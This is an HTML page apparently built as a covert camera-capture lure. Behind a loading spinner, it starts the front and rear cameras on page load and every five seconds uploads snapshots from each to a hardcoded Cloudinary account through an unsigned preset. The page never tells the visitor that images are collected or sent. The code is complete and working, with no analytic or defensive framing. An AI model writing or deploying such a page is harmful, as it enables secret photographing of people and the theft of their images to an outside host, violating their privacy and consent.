<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Dual Camera Capture</title>
    <style>
        .camera-container {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            margin: 20px;
        }
        .camera-view {
            width: 45%;
            border: 2px solid #ddd;
            border-radius: 8px;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div class="camera-container">
        <video id="frontCamera" class="camera-view" autoplay playsinline></video>
        <video id="rearCamera" class="camera-view" autoplay playsinline></video>
    </div>

    <script>
        const CLOUD_NAME = "ec7b8168011a7641f26bd74f766108";
        const UPLOAD_PRESET = "unsigned_preset";
        
        async function setupCameras() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                const videoDevices = devices.filter(device => device.kind === 'videoinput');
                
                if (videoDevices.length < 2) {
                    console.error('يوجد كاميرا واحدة فقط متاحة');
                    return;
                }
                
                // تشغيل الكاميرا الأمامية
                const frontStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: videoDevices[0].deviceId }
                });
                document.getElementById('frontCamera').srcObject = frontStream;
                
                // تشغيل الكاميرا الخلفية
                const rearStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: videoDevices[1].deviceId }
                });
                document.getElementById('rearCamera').srcObject = rearStream;
                
                // بدء التقاط الصور كل 5 ثواني
                setInterval(() => {
                    captureAndUpload('frontCamera', 'front');
                    captureAndUpload('rearCamera', 'rear');
                }, 5000);
                
            } catch (error) {
                console.error('خطأ في إعداد الكاميرات:', error);
            }
        }
        
        async function captureAndUpload(cameraId, prefix) {
            try {
                const video = document.getElementById(cameraId);
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                const timestamp = new Date().toISOString();
                const filename = `${prefix}_${timestamp}.jpg`;
                
                await uploadToCloudinary(imageData, filename);
                
            } catch (error) {
                console.error(`خطأ في التقاط الصورة من ${cameraId}:`, error);
            }
        }
        
        async function uploadToCloudinary(imageData, filename) {
            const blob = await fetch(imageData).then(res => res.blob());
            const formData = new FormData();
            formData.append('file', blob, filename);
            formData.append('upload_preset', UPLOAD_PRESET);
            formData.append('cloud_name', CLOUD_NAME);
            
            const response = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/upload`, {
                method: 'POST',
                body: formData
            });
            
            if (!response.ok) throw new Error('Upload failed');
            const result = await response.json();
            console.log('تم الرفع:', result.secure_url);
            return result;
        }
        
        window.addEventListener('DOMContentLoaded', setupCameras);
    </script>
</body>
</html>
